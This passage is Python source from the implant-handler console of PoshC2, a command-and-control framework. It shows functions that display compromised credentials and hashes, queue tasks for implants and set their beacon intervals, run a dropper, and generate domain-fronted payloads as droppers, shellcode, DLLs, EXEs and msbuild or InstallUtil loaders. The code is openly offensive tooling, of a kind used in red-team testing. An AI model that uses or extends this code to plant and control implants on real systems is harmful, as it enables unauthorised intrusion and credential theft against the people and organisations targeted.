        username = username.strip()
        creds, hashes = parse_creds(get_creds_for_user(username))
        print_good("Credentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
        return
    else:
        creds, hashes = parse_creds(get_creds())
        print_good("\nCredentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))


def do_pwnself(user, command):
    subprocess.Popen(["python2.7", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
    clear()


def do_p(user, command):
    return do_pwnself(user, command)


def do_tasks(user, command):
    alltasks = ""
    tasks = get_newtasks_all()
    if tasks is None:
        print_good("No tasks queued!\r\n")
    else:
        for task in tasks:
            imname = get_implantdetails(task.RandomURI)
            if imname.ImplantID is not None:
                alltasks += f"[{imname.ImplantID}] : {imname.Domain}\\{imname.User} | {task.Command} : {task.TaskID}\r\n"
        print_good("Queued tasks:\r\n\r\n%s" % alltasks)
    input("Press Enter to continue...")
    clear()


def do_cleartasks(user, command):
    drop_newtasks()
    print_good("Emptied tasks queue\r\n")
    input("Press Enter to continue...")
    clear()


def do_del_task(user, command):
    deltask_id = command.lower().replace("kill", "").strip()
    if not deltask_id:
        deltask_id = input("Enter task ID: ")
    del_newtasks(deltask_id)
    print_good("task has been cleared\r\n")
    input("Press Enter to continue...")
    clear()


def do_quit(user, command):
    ri = input("Are you sure you want to quit? (Y/n) ")
    if ri.lower() == "n":
        return
    if ri == "" or ri.lower() == "y":
        new_c2_message("%s logged off." % user)
        sys.exit(0)


def do_createdaisypayload(user, command):
    name = input(Colours.GREEN + "Daisy Payload Name: e.g. DC1 ")
    default_url = get_first_url(PayloadCommsHost, DomainFrontHeader)
    daisyurl = input(f"Daisy URL: e.g. http://10.0.0.1:8888 ")
    if ("http://127.0.0.1" in daisyurl):
        daisyurl = daisyurl.replace("http://127.0.0.1", "http://localhost")
    if ("https://127.0.0.1" in daisyurl):
        daisyurl = daisyurl.replace("https://127.0.0.1", "https://localhost")
    daisyhostid = input("Select Daisy Implant Host: e.g. 5 ")
    daisyhost = get_implantbyid(daisyhostid)
    proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
    pbindsecret = PBindSecret
    pbindpipename = PBindPipeName
    fcomm_filename = FCommFileName

    daisyurl, daisyurl_count = string_to_array(daisyurl)
    daisyhostheader = ""

    c = 0
    daisyurls = daisyurl.split(",")
    for url in daisyurls:
        if c > 0:
            daisyhostheader += ",\"\""
        else:
            daisyhostheader += "\"\""
        c += 1

    C2 = get_c2server_all()
    urlId = new_urldetails(name, daisyurl, "\"\"", "", "", "", "")
    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer,
                          "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone, URLID=urlId, PBindPipeName=pbindpipename, PBindSecret=pbindsecret, FCommFileName=fcomm_filename)
    newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
    newPayload.CreateDroppers("%s_" % name)
    newPayload.CreateShellcode("%s_" % name)
    newPayload.CreatePS("%s_" % name)
    newPayload.CreatePSInjectors("%s_" % name)
    newPayload.CreateRaw("%s_" % name)
    newPayload.CreateDlls("%s_" % name)
    newPayload.CreateEXE("%s_" % name)
    newPayload.CreateMsbuild("%s_" % name)
    newPayload.CreateDonutShellcode("%s_" % name)
    newPayload.BuildDynamicPayloads("%s_" % name)
    print_good("Created new %s daisy payloads" % name)
    input("Press Enter to continue...")
    clear()


def do_createnewpayload(user, command, creds=None, shellcodeOnly=False, pbindOnly=False, linuxOnly=False,custom=False):
    params = re.compile("createnewpayload ", re.IGNORECASE)
    params = params.sub("", command)
    creds = None
    if "-credid" in params:
        creds, params = get_creds_from_params(params, user)
        if creds is None:
            return
        if not creds['Password']:
            print_bad("This command does not support credentials with hashes")
            input("Press Enter to continue...")
            clear()
            return
    name = input(Colours.GREEN + "Payload Name (e.g. Scenario_One): ")
    comms_url = input("Domain or URL in array format (e.g. https://www.example.com,https://www.example2.com): ")
    domainfront = input("Domain front URL in array format (e.g. fjdsklfjdskl.cloudfront.net,jobs.azureedge.net): ")
    proxyurl = input("Proxy URL (e.g. http://10.150.10.1:8080): ")
    pbindsecret = input(f"PBind Secret (e.g {PBindSecret}): ")
    pbindpipename = input(f"PBind Pipe Name (e.g. {PBindPipeName}): ")
    fcomm_filename = input(f"FComm File Name (e.g. {FCommFileName}): ")
    user_agent = input(f"User Agent (e.g. {UserAgent}): ")
    type = None
    if custom:
        type = input(f"type (e.g PEzor/DinstallUtil/DEXE/PinstallUtil/PEXE/Pmsbuild): ")
        shellcodePath = input(f"shellcode file path (binary format): ")
        arch = input(f"architecture (e.g x86/x64): ")
    if not pbindsecret:
        pbindsecret = PBindSecret

    if not pbindpipename:
        pbindpipename = PBindPipeName

    if not user_agent:
        user_agent = UserAgent

    if not fcomm_filename:
        fcomm_filename = FCommFileName
    comms_url, PayloadCommsHostCount = string_to_array(comms_url)
    domainfront, DomainFrontHeaderCount = string_to_array(domainfront)
    if PayloadCommsHostCount == DomainFrontHeaderCount:
        pass
    else:
        print("[-] Error - different number of host headers and URLs")
        input("Press Enter to continue...")
        clear()

    proxyuser = ""
    proxypass = ""
    credsexpire = ""
    if proxyurl:
        if creds is not None:
            proxyuser = "%s\\%s" % (creds['Domain'], creds['Username'])
            proxypass = creds['Password']
        else:
            proxyuser = input(Colours.GREEN + "Proxy User (e.g. Domain\\user): ")
            proxypass = input("Proxy Password (e.g. Password1): ")
        credsexpire = input(Colours.GREEN + "Password/Account Expiration Date (e.g. 15/03/2018): ")
        imurl = "%s?p" % get_newimplanturl()
    else:
        imurl = get_newimplanturl()
    C2 = get_c2server_all()

    urlId = new_urldetails(name, comms_url, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, user_agent, C2.Referrer, imurl, PayloadsDirectory, URLID=urlId, PBindPipeName=pbindpipename, PBindSecret=pbindsecret, FCommFileName=fcomm_filename)

    if custom:
        if type.lower() == "dinstallutil":
            newPayload.CreateInstallUtil(shellcodePath,arch,"%s_" %name)
        elif type.lower() == "dexe":
            newPayload.CreateDInvokeEXE(shellcodePath,arch,"%s_"%name)
        elif type.lower() == "pinstallutil":
            newPayload.CreatePInvokeInstallUtil(shellcodePath,arch,"%s_" %name)
        elif type.lower() == "pexe":
            newPayload.CreatePInvokeEXE(shellcodePath,arch,"%s_" %name)
        elif type.lower() == "pmsbuild":
            newPayload.CreatePMsbuild(shellcodePath,arch,"%s_" %name)
        elif type.lower() == "pezor":
            newPayload.CreatePezorsFromShellcode(shellcodePath,arch,"%s_"%name)
    elif shellcodeOnly:
        newPayload.CreateDroppers("%s_" % name)
        newPayload.CreateShellcode("%s_" % name)
        newPayload.CreateDonutShellcode("%s_" % name)
    elif pbindOnly:
        newPayload.CreatePbind("%s_" % name)
    elif linuxOnly:
        newPayload.BuildLinuxPayloads("%s_" % name)
    else:
        newPayload.CreateAll("%s_" % name)

    print_good("Created new payloads")
    input("Press Enter to continue...")
    clear()


def do_help(user, command):
    print_good(server_help)
    input("Press Enter to continue...")
    clear()


def do_history(user, command):
    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
        for line in hisfile:
            if line.startswith("+"):
                print(Colours.GREEN + line.replace("+", "").replace("\n", ""))
    input("Press Enter to continue...")
    clear()


def do_hide_dead_implants(user, command):
    implants = get_implants()
    if implants:
        for implant in implants:
            RandomURI = implant.RandomURI
            Sleep = implant.Sleep.strip()
            LastSeen = implant.LastSeen
            LastSeenTime = datetime.strptime(LastSeen, "%Y-%m-%d %H:%M:%S")
            LastSeenTime = LastSeenTime.replace(tzinfo=utcTimezone)
            now = datetime.now(timezone.utc)
            sleep_int = sleepint(Sleep)
            nowMinus10Beacons = now - timedelta(seconds=(sleep_int * 10))
            if nowMinus10Beacons > LastSeenTime:
                hide_implant(RandomURI)
    clear()


def sleepint(sleep):
    if(sleep.endswith('s')):
        sleep_int = int(sleep[:-1])
    elif(sleep.endswith('m')):
        sleep_int = int(sleep[:-1]) * 60
    elif(sleep.endswith('h')):
        sleep_int = int(sleep[:-1]) * 60 * 60
    else:
        sleep_int = "error"
    return sleep_int


def do_use(user, command):
    command = command.replace("use ", "")


def do_label_implant(user, command, randomuri):
    label = command.replace('label-implant', '').strip()
    implant_type = get_implanttype(randomuri)
    if "PB" in implant_type:
        print("Cannot re-label a PBind implant at this time")
    elif "FC" in implant_type:
        print("Cannot re-label an FComm implant at this time")
    else:
        update_label(label, randomuri)


def do_remove_label(user, command, randomuri):
    update_label("", randomuri)


def do_beacon(user, command, randomuri):
    new_sleep = command.replace('beacon ', '').strip()
    if not validate_sleep_time(new_sleep):
        print_bad("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
    else:
        new_task(command, user, randomuri)


def do_set_beacon(user, command, randomuri):
    return do_beacon(user, command, randomuri)


def do_unhide_implant(user, command, randomuri):
    unhide_implant(randomuri)


def do_hide_implant(user, command, randomuri):
    hide_implant(randomuri)


def clear():
    try:
        os.system('clear')
    except Exception:
        print("cls")
        print(chr(27) + "[2J")
    print(Colours.GREEN)
    print(banner)


def main(args):
    signal.signal(signal.SIGINT, catch_exit)
    user = None
    autohide = None
    if len(args) > 0:
        parser = argparse.ArgumentParser(description='The command line for handling implants in PoshC2')
        parser.add_argument('-u', '--user', help='the user for this session')
        parser.add_argument('-a', '--autohide', help='to autohide implants after 30 inactive beacons', action='store_true')
        args = parser.parse_args(args)
        user = args.user
        autohide = args.autohide
    while not user:
        print(Colours.GREEN + "A username is required for logging")
        user = input("Enter your username: ")
    if DatabaseType == DBType.SQLite and not os.path.isfile(Database):
        print(Colours.RED + "The project database has not been created yet")
        sys.exit()
    database_connect()
    new_c2_message("%s logged on." % user)
    clear()
    implant_handler_command_loop(user, "", autohide)


if __name__ == '__main__':
    args = sys.argv
    main(args)
